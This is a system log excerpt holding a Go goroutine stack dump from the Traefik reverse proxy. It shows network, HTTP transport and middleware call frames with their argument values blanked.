jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4458287 [runnable]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461219 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*connreader).backgroundread( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:668 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*connreader).startbackgroundread
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:664 +
jun 29 15:17:29 [localhost] traefik: goroutine 4359754 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4458288 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).waitforcontinue.func1( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1803 +
jun 29 15:17:29 [localhost] traefik: net/http.(*request).write( , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/request.go:609 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1825 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4447715 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).readslice( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:341 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).readline( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:370 +
jun 29 15:17:29 [localhost] traefik: net/textproto.(*reader).readlineslice( , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/textproto/reader.go:55 +
jun 29 15:17:29 [localhost] traefik: net/textproto.(*reader).readline( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/textproto/reader.go:36 +
jun 29 15:17:29 [localhost] traefik: net/http.readresponse( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/response.go:155 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readresponse( , , , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1783 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1616 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4447716 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4445621 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1717 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 3535097 [io wait, 1 minutes]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*connreader).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:764 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1855 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4460137 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4438497 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461135 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.setrequestcancel.func3( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:323 +
jun 29 15:17:29 [localhost] traefik: created by net/http.setrequestcancel
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:322 +
jun 29 15:17:29 [localhost] traefik: goroutine 4455865 [io wait, 1 minutes]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461276 [runnable]:
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:153
jun 29 15:17:29 [localhost] traefik: created by net/http/httputil.(*reverseproxy).servehttp
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:153 +
jun 29 15:17:29 [localhost] traefik: goroutine 4460138 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461270 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.setrequestcancel.func3( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:323 +
jun 29 15:17:29 [localhost] traefik: created by net/http.setrequestcancel
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:322 +
jun 29 15:17:29 [localhost] traefik: goroutine 4210881 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4456643 [io wait, 1 minutes]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4447649 [runnable]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*loghandler).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/logger.go:148 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: net/http.serverhandler.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2694 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1830 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4437770 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:2033 +
jun 29 15:17:29 [localhost] traefik: net/http.(*transport).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:422 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.errorhandlingroundtripper.roundtrip( , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:150 +
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:193 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*httpforwarder).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:493 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*forwarder).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:263 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp.func1( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:26 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavebackend( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:56 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavefrontend( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:50 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin.(*roundrobin).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin/rr.go:129 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*emptybackendhandler).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/empty_backend_handler.go:29 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*handlerswitcher).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/handlerswitcher.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/thoas/stats.(*stats).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:64 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*loghandler).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/logger.go:160 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
